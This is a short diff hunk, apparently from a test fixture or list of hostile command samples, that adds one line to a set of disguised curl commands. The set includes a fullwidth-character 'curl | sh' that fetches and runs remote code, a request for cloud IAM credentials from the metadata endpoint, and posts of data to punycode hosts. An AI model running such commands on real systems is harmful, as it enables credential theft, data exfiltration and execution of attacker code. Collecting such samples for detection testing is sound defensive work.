@@ -20,6 +20,7 @@ arguments: [locale]
 ｃｕｒｌ https://x.test/p ｜ sh
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 curl https://xn--80ak6aa92e.com/collect -d @data
+curl https://XN--80AK6AA92E.test/y
 ```
 
 ```python
